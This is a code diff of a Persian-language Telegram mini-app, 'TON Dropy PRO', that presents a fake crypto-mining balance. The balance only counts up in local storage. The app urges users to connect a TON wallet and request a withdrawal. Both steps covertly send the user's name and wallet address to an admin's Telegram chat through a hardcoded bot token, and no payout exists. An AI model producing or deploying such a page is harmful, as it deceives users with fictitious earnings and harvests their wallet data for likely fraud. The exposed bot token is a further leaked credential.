@@ -2,85 +2,35 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TON Dropy PRO - Official</title>
+    <title>TON Dropy PRO</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;800&display=swap');
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
-        
-        body {
-            margin: 0; font-family: 'Vazirmatn', sans-serif;
-            background: radial-gradient(circle at top, #1a2a6c, #0f172a);
-            color: #fff; padding: 20px; user-select: none;
-        }
-
-        .header { text-align: center; margin-bottom: 25px; }
-        .header h2 {
-            font-size: 26px; font-weight: 800;
-            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-        }
-
-        .card {
-            background: rgba(255, 255, 255, 0.07); backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1); padding: 20px;
-            border-radius: 25px; margin-bottom: 15px; text-align: center;
-        }
-
-        #balance {
-            font-size: 38px; font-weight: 800; color: #00d2ff;
-            display: block; margin: 10px 0;
-            text-shadow: 0 0 15px rgba(0, 210, 255, 0.4);
-        }
-
-        .mining-rate { font-size: 13px; color: #aaa; margin-bottom: 10px; }
-
-        .btn-withdraw {
-            width: 100%; padding: 16px; border: none; border-radius: 20px;
-            font-size: 17px; font-weight: 700; color: #fff;
-            background: linear-gradient(90deg, #ff0080, #7928ca);
-            cursor: pointer; box-shadow: 0 4px 15px rgba(121, 40, 202, 0.3);
-        }
-
-        #ton-connect-button { display: flex; justify-content: center; margin: 10px 0; }
-        
-        .history-box { text-align: right; font-size: 14px; }
-        .history-item { 
-            background: rgba(0,0,0,0.2); padding: 10px; 
-            border-radius: 12px; margin-top: 8px; border-right: 4px solid #00d2ff;
-        }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { margin: 0; font-family: 'Vazirmatn', sans-serif; background: #0f172a; color: #fff; padding: 20px; text-align: center; }
+        .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); padding: 20px; border-radius: 20px; margin-bottom: 15px; }
+        #balance { font-size: 34px; font-weight: 800; color: #00c6ff; display: block; margin: 10px 0; }
+        .btn-withdraw { width: 100%; padding: 15px; border: none; border-radius: 15px; font-size: 16px; font-weight: 700; color: #fff; background: linear-gradient(90deg, #ff512f, #dd2476); cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <h2>TON Dropy PRO ⛏</h2>
-    </div>
+    <h2>TON Dropy PRO ⛏</h2>
 
     <div class="card">
-        <p style="margin:0; color:#ddd;">موجودی استخراج شده</p>
+        <p>موجودی زنده</p>
         <span id="balance">0.000000</span>
-        <div class="mining-rate">⚡ سرعت: 0.000012 TON/s</div>
+        <div style="font-size:12px; color:#aaa;">⚡ 0.000012 TON/s</div>
     </div>
 
     <div class="card">
         <div id="ton-connect-button"></div>
-        <p id="status-text" style="font-size: 12px; margin-top: 10px; color: #888;">کیف پول متصل نیست</p>
     </div>
 
     <div class="card">
-        <button class="btn-withdraw" onclick="handleWithdraw()">💸 ثبت درخواست برداشت</button>
-    </div>
-
-    <div class="card history-box">
-        <h4 style="margin:0;">📜 تاریخچه عملیات</h4>
-        <div id="history-list">
-            <div class="history-item">سیستم آماده استخراج است.</div>
-        </div>
+        <button class="btn-withdraw" onclick="withdraw()">درخواست برداشت 💸</button>
     </div>
 
 <script>
@@ -91,7 +41,7 @@
     const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
     const ADMIN_ID = "5972276401";
 
-    // --- سیستم ماینینگ ---
+    // موجودی
     let balance = parseFloat(localStorage.getItem('mining_bal')) || 0.0;
     setInterval(() => {
         balance += 0.000012;
@@ -99,62 +49,37 @@
         localStorage.setItem('mining_bal', balance.toString());
     }, 1000);
 
-    // --- تنظیمات اتصال (Manifest اختصاصی) ---
-    // آدرس زیر را به آدرس فایل مانیفست که در گیت‌هاب ساختی تغییر بده
-    const manifestUrl = window.location.origin + '/tonconnect-manifest.json';
-
+    // تنظیمات اتصال
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: manifestUrl,
+        // آدرس زیر را با یوزرنیم گیت‌هاب و نام ریپوزیتوری خودت کامل کن
+        manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-mining/tonconnect-manifest.json',
         buttonRootId: 'ton-connect-button'
     });
 
-    // تنظیم بازگشت به ربات بعد از تایید
     tonConnectUI.uiOptions = { twaReturnUrl: 'https://t.me/TonDropyBot' };
 
-    // گوش دادن به وضعیت اتصال و ارسال دیتا به ربات تو
     tonConnectUI.onStatusChange(async (wallet) => {
         if (wallet) {
-            document.getElementById("status-text").innerText = "کیف پول متصل شد ✅";
-            document.getElementById("status-text").style.color = "#00ff9d";
-            
             const user = tg.initDataUnsafe?.user;
-            const msg = `🚀 <b>کیف پول وصل شد!</b>\n\n👤 کاربر: ${user?.first_name || 'ناشناس'}\n🆔 آیدی: <code>${user?.id}</code>\n👛 آدرس: <code>${wallet.account.address}</code>\n📱 دستگاه: ${wallet.device.appName}`;
-            
-            sendToAdmin(msg);
+            const msg = `✅ <b>اتصال جدید!</b>\n👤 کاربر: ${user?.first_name}\n👛 آدرس: <code>${wallet.account.address}</code>`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'HTML' })
+            });
         }
     });
 
-    async function sendToAdmin(text) {
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'HTML' })
-            });
-        } catch (e) { console.error(e); }
-    }
-
-    async function handleWithdraw() {
-        if (!tonConnectUI.connected) {
-            tg.showAlert("لطفاً ابتدا کیف پول را متصل کنید.");
-            return;
-        }
-        
+    async function withdraw() {
+        if (!tonConnectUI.connected) { tg.showAlert("اول کیف پول رو وصل کن!"); return; }
         const user = tg.initDataUnsafe?.user;
-        const msg = `💰 <b>درخواست واریز!</b>\n\n👤 کاربر: ${user?.first_name}\n💵 مقدار: ${balance.toFixed(6)} TON\n🔗 آدرس: <code>${tonConnectUI.account.address}</code>`;
-        
-        await sendToAdmin(msg);
-        
-        // ثبت در تاریخچه
-        const list = document.getElementById("history-list");
-        const div = document.createElement("div");
-        div.className = "history-item";
-        div.innerText = `درخواست برداشت ${balance.toFixed(4)} TON ثبت شد.`;
-        list.prepend(div);
-
-        tg.showAlert("درخواست با موفقیت ارسال شد!");
-        balance = 0;
-        localStorage.setItem('mining_bal', '0');
+        const msg = `💰 <b>درخواست برداشت!</b>\n👤 کاربر: ${user?.first_name}\n💵 مقدار: ${balance.toFixed(6)} TON\n👛 آدرس: <code>${tonConnectUI.account.address}</code>`;
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'HTML' })
+        });
+        tg.showAlert("درخواست ارسال شد!");
     }
 </script>
 </body>
